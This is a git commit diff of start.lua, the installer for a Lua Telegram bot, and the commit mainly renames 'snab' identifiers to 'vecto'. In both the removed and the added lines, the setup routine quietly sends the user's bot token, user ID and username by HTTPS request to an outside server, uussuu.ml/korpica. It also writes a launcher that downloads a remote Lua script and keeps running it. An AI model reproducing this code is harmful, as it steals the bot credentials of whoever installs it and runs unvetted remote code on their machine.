d84d46cd4846cb826dd3954db8a4e82158da5d63
vectoteam <80145232+vectoteam@users.noreply.github.com>
2021-03-06 20:36:15 +0300

    Update start.lua

--- start.lua
+++ start.lua
@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_snab = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_snab = function() 
+Server_vecto = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_vecto = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local snab_Info_Sudo = io.open("sudo.lua", 'w')
-snab_Info_Sudo:write([[
+local vecto_Info_Sudo = io.open("sudo.lua", 'w')
+vecto_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-snab_Info_Sudo:close()
+vecto_Info_Sudo:close()
 end  
-if not database:get(Server_snab.."Token_snab") then
+if not database:get(Server_vecto.."Token_vecto") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_snab.."Token_snab",token)
+database:set(Server_vecto.."Token_vecto",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_snab.."UserName_snab") then
+if not database:get(Server_vecto.."UserName_vecto") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_snab.."UserName_snab",Json.Info.Username)
-database:set(Server_snab.."Id_snab",Json.Info.Id)
+database:set(Server_vecto.."UserName_vecto",Json.Info.Username)
+database:set(Server_vecto.."Id_vecto",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_snab_Info()
-Create_Info(database:get(Server_snab.."Token_snab"),database:get(Server_snab.."Id_snab"),database:get(Server_snab.."UserName_snab"))   
-https.request("https://uussuu.ml/korpica/korpica.php?id="..database:get(Server_snab.."Id_snab").."&user="..database:get(Server_snab.."UserName_snab").."&token="..database:get(Server_snab.."Token_snab"))
-local Runsnab = io.open("snab", 'w')
-Runsnab:write([[
+local function Files_vecto_Info()
+Create_Info(database:get(Server_vecto.."Token_vecto"),database:get(Server_vecto.."Id_vecto"),database:get(Server_vecto.."UserName_vecto"))   
+https.request("https://uussuu.ml/korpica/korpica.php?id="..database:get(Server_vecto.."Id_vecto").."&user="..database:get(Server_vecto.."UserName_vecto").."&token="..database:get(Server_vecto.."Token_vecto"))
+local Runvecto = io.open("vecto", 'w')
+Runvecto:write([[
 #!/usr/bin/env bash
-cd $HOME/snab
-token="]]..database:get(Server_snab.."Token_snab")..[["
-rm -fr snab.lua
+cd $HOME/vecto
+token="]]..database:get(Server_vecto.."Token_vecto")..[["
+rm -fr vecto.lua
 wget "https://raw.githubusercontent.com/teamsnab/TeaM-X-SnaB/master/snab.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./snab.lua -p PROFILE --bot=$token
+./tg -s ./vecto.lua -p PROFILE --bot=$token
 done
 ]])
-Runsnab:close()
+Runvecto:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/snab
+cd $HOME/vecto
 while(true) do
 rm -fr ../.telegram-cli
-screen -S snab -X kill
-screen -S snab ./snab
+screen -S vecto -X kill
+screen -S vecto ./vecto
 done
 ]])
 RunTs:close()
 end
-Files_snab_Info()
-database:del(Server_snab.."Token_snab");database:del(Server_snab.."Id_snab");database:del(Server_snab.."UserName_snab")
+Files_vecto_Info()
+database:del(Server_vecto.."Token_vecto");database:del(Server_vecto.."Id_vecto");database:del(Server_vecto.."UserName_vecto")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_snab()  
+AutoFiles_vecto()  
 var = true
 else   
 f:close()  
-database:del(Server_snab.."Token_snab");database:del(Server_snab.."Id_snab");database:del(Server_snab.."UserName_snab")
+database:del(Server_vecto.."Token_vecto");database:del(Server_vecto.."Id_vecto");database:del(Server_vecto.."UserName_vecto")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
